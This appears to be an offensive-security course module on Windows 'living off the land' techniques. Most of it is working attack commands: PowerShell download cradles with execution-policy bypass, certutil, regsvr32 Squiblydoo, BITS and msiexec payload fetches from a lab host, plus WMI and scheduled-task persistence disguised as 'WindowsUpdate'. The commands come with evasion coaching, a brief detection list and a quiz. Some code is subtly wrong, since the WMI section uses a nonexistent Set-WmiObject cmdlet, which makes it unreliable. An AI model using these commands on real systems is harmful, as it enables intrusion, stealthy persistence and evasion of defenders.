# MODULE 19: LIVING OFF THE LAND

## First Principle
You don't drop tools. You use what's already there. Every Windows install has 100+ signed binaries that can download, execute, encode, and persist. The defender can't block them — they're part of the OS.

## Section 1: PowerShell Cradles

### Download cradle
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.92/a.ps1')"
```

### Base64-encoded cradle
```powershell
powershell -ep bypass -e <base64_encoded_commands>
```

### Why it works
PowerShell is trusted. It's signed by Microsoft. It has .NET under the hood. The defender's job is to decide if the SCRIPT is malicious, not if PowerShell itself is. Obfuscation buys time.

## Section 2: certutil

### Download + decode
```cmd
certutil -urlcache -split -f http://192.168.1.92/payload.exe %TEMP%\p.exe
```

### Base64 decode (built-in)
```cmd
certutil -decode input.b64 output.exe
```

### Why it works
certutil is a certificate management tool. It's signed. It downloads files and decodes base64. The defender sees "certutil.exe running" — that's normal. The URL and the output path are the signals, and you control both.

## Section 3: regsvr32 — Squiblydoo

### Execute remote scriptlet
```cmd
regsvr32 /s /n /u /i:http://192.168.1.92/payload.sct scrobj.dll
```

### Why it works
regsvr32 registers COM objects. The `/i` flag specifies an INF or scriptlet file. It downloads and executes it. No PowerShell. No cmd.exe. Just a signed Microsoft binary doing what it's designed to do — load a script.

## Section 4: BITS Jobs

### Background Intelligent Transfer Service
```powershell
Start-BitsTransfer -Source http://192.168.1.92/payload.exe -Destination $env:TEMP\p.exe
```

### Why it works
BITS is how Windows Update downloads patches. It's designed for unreliable networks, resumes downloads, and runs as SYSTEM. The defender sees BITS activity constantly — it's background noise.

## Section 5: WMI Persistence Triad

### Event subscription (triggers on boot)
```powershell
$filter = Set-WmiObject -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="BootFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"}
$consumer = Set-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="BootConsumer"; CommandLineTemplate="cmd.exe /c %TEMP%\p.exe"}
Set-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter; Consumer=$consumer}
```

### Why it works
WMI subscriptions are event-driven. They trigger on system events (boot, process creation, time intervals). They store in the WMI repository — not the registry, not the filesystem. Most AV doesn't scan WMI.

## Section 6: schtasks

### Scheduled task persistence
```cmd
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c %TEMP%\p.exe" /sc onlogon /ru SYSTEM
```

### Why it works
Task Scheduler is a legitimate Windows service. Tasks run as SYSTEM, as user, on boot, on idle, on event. The task name "WindowsUpdate" blends in. The action is a command line — anything you want.

## Section 7: msiexec Remote MSI

### Install from remote
```cmd
msiexec /q /i http://192.168.1.92/payload.msi
```

### Why it works
msiexec installs MSI packages. It downloads from URLs. It runs with elevated privileges. The defender sees "Windows Installer doing its job." The MSI is your payload, signed or not — msiexec doesn't care.

## Section 8: Detection

Every technique has a signature:
- PowerShell: Event ID 4103 (module logging), 4104 (script block logging)
- certutil: Process creation with URL in command line
- regsvr32: Network connection from regsvr32.exe
- BITS: Event ID 59 (BITS job creation)
- WMI: Event ID 19, 20, 21 (WMI activity)
- schtasks: Event ID 4698 (task creation)
- msiexec: Network connection from msiexec.exe

## Lab: Build a LOTL Chain

1. Download payload with certutil
2. Execute with regsvr32
3. Persist with WMI subscription
4. Verify with Event Viewer — find your own artefacts

## MCQ

1. Which Windows binary downloads files and decodes base64?
   a) powershell.exe
   b) certutil.exe
   c) regsvr32.exe
   d) msiexec.exe
   **Answer: b**

2. What event ID indicates WMI activity?
   a) 4688
   b) 4698
   c) 19-21
   d) 4104
   **Answer: c**

3. Why is BITS effective for download?
   a) It runs as user
   b) It's background noise on every Windows box
   c) It requires admin
   d) It logs everything
   **Answer: b**
